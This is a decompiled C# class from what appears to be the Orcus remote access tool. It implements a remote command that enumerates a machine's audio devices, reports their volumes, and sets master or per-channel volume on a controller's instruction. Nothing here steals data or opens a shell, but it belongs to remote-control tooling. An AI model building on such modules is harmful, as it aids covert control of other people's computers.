using System;
using System.Collections.Generic;
using System.Linq;
using CSCore.CoreAudioAPI;
using CSCore.SoundOut;
using CSCore.Win32;
using Orcus.Plugins;
using Orcus.Shared.Commands.AudioVolumeControl;
using Orcus.Shared.NetSerializer;

namespace Orcus.Commands.AudioVolumeControl;

internal class AudioVolumeControlCommand : Command
{
	private readonly List<string> _deviceList;

	private readonly object _listsLock = new object();

	public AudioVolumeControlCommand()
	{
		_deviceList = new List<string>();
	}

	public override void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo)
	{
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0004: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected I4, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
		//IL_003a: Expected O, but got Unknown
		//IL_003c: Expected O, but got Unknown
		//IL_00c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cf: Expected O, but got Unknown
		AudioVolumeControlCommunication val = (AudioVolumeControlCommunication)parameter[0];
		MMDevice audioDevice;
		switch ((int)val)
		{
		default:
			throw new ArgumentOutOfRangeException();
		case 0:
		{
			if (!WasapiOut.get_IsSupportedOnCurrentPlatform())
			{
				((Command)this).ResponseByte((byte)7, connectionInfo);
				break;
			}
			List<AudioDevice> list = new List<AudioDevice>();
			MMDeviceEnumerator val5 = new MMDeviceEnumerator();
			MMDeviceEnumerator val6 = val5;
			MMDeviceEnumerator val7 = val5;
			try
			{
				MMDevice defaultAudioEndpoint = val6.GetDefaultAudioEndpoint((DataFlow)1, (Role)2);
				MMDevice defaultAudioEndpoint2 = val6.GetDefaultAudioEndpoint((DataFlow)0, (Role)1);
				MMDeviceCollection val8 = val6.EnumAudioEndpoints((DataFlow)1, (DeviceState)1);
				try
				{
					list.AddRange(GetAudioDevices(val8, defaultAudioEndpoint.get_DeviceID(), (AudioEndpointType)1));
				}
				finally
				{
					((IDisposable)val8)?.Dispose();
				}
				MMDeviceCollection val9 = val6.EnumAudioEndpoints((DataFlow)0, (DeviceState)1);
				try
				{
					list.AddRange(GetAudioDevices(val9, defaultAudioEndpoint2.get_DeviceID(), (AudioEndpointType)0));
				}
				finally
				{
					((IDisposable)val9)?.Dispose();
				}
				((ComObject)defaultAudioEndpoint2).Dispose();
				((ComObject)defaultAudioEndpoint).Dispose();
				Serializer val10 = new Serializer(typeof(List<AudioDevice>));
				((Command)this).ResponseBytes((byte)3, val10.Serialize((object)list), connectionInfo);
				break;
			}
			finally
			{
				((IDisposable)val7)?.Dispose();
			}
		}
		case 1:
		{
			lock (_listsLock)
			{
				audioDevice = GetAudioDevice(_deviceList[BitConverter.ToInt32(parameter, 1)]);
			}
			if (audioDevice == null)
			{
				((Command)this).ResponseByte((byte)5, connectionInfo);
				break;
			}
			float masterVolumeLevelScalar = BitConverter.ToSingle(parameter, 5);
			AudioEndpointVolume val2;
			AudioEndpointVolume val3 = (val2 = AudioEndpointVolume.FromDevice(audioDevice));
			try
			{
				val2.set_MasterVolumeLevelScalar(masterVolumeLevelScalar);
			}
			finally
			{
				((IDisposable)val3)?.Dispose();
			}
			((Command)this).ResponseByte((byte)4, connectionInfo);
			break;
		}
		case 2:
		{
			lock (_listsLock)
			{
				audioDevice = GetAudioDevice(_deviceList[BitConverter.ToInt32(parameter, 1)]);
			}
			if (audioDevice == null)
			{
				((Command)this).ResponseByte((byte)5, connectionInfo);
				break;
			}
			AudioEndpointVolume val2;
			AudioEndpointVolume val3 = (val2 = AudioEndpointVolume.FromDevice(audioDevice));
			try
			{
				int channelIndex = BitConverter.ToInt32(parameter, 5);
				AudioEndpointVolumeChannel val4 = ((IEnumerable<AudioEndpointVolumeChannel>)val2.get_Channels()).FirstOrDefault((Func<AudioEndpointVolumeChannel, bool>)((AudioEndpointVolumeChannel x) => x.get_ChannelIndex() == channelIndex));
				if (val4 == null)
				{
					((Command)this).ResponseByte((byte)6, connectionInfo);
					break;
				}
				val4.set_VolumeScalar(BitConverter.ToSingle(parameter, 5));
				((Command)this).ResponseByte((byte)4, connectionInfo);
				break;
			}
			finally
			{
				((IDisposable)val3)?.Dispose();
			}
		}
		}
	}

	private IEnumerable<AudioDevice> GetAudioDevices(MMDeviceCollection mmDeviceCollection, string defaultDeviceId, AudioEndpointType audioEndpointType)
	{
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		lock (_listsLock)
		{
			foreach (MMDevice item in mmDeviceCollection)
			{
				AudioEndpointVolume val = AudioEndpointVolume.FromDevice(item);
				int deviceId;
				if (_deviceList.Contains(item.get_DeviceID()))
				{
					deviceId = _deviceList.IndexOf(item.get_DeviceID());
				}
				else
				{
					deviceId = _deviceList.Count;
					_deviceList.Add(item.get_DeviceID());
				}
				AudioEndpointVolume val2 = val;
				try
				{
					MMDevice val3 = item;
					try
					{
						AudioDevice val4 = new AudioDevice();
						val4.set_DeviceId(deviceId);
						val4.set_Name(item.get_FriendlyName());
						val4.set_IsDefault(item.get_DeviceID() == defaultDeviceId);
						val4.set_CurrentVolume(val.get_MasterVolumeLevelScalar());
						val4.set_AudioEndpointType(audioEndpointType);
						val4.set_AudioChannels(((IEnumerable<AudioEndpointVolumeChannel>)val.get_Channels()).Select((Func<AudioEndpointVolumeChannel, AudioChannel>)delegate(AudioEndpointVolumeChannel x)
						{
							//IL_0000: Unknown result type (might be due to invalid IL or missing references)
							//IL_0005: Unknown result type (might be due to invalid IL or missing references)
							//IL_0011: Unknown result type (might be due to invalid IL or missing references)
							//IL_001e: Expected O, but got Unknown
							AudioChannel val5 = new AudioChannel();
							val5.set_ChannelIndex(x.get_ChannelIndex());
							val5.set_Volume(x.get_VolumeScalar());
							return val5;
						}).ToList());
						yield return val4;
					}
					finally
					{
						((IDisposable)val3)?.Dispose();
					}
				}
				finally
				{
					((IDisposable)val2)?.Dispose();
				}
			}
		}
	}

	private MMDevice GetAudioDevice(string deviceId)
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0013: Expected O, but got Unknown
		MMDeviceEnumerator val = new MMDeviceEnumerator();
		try
		{
			return ((IEnumerable<MMDevice>)val.EnumAudioEndpoints((DataFlow)2, (DeviceState)1)).FirstOrDefault((Func<MMDevice, bool>)((MMDevice x) => x.get_DeviceID() == deviceId));
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
	}

	protected override uint GetId()
	{
		return 2u;
	}
}
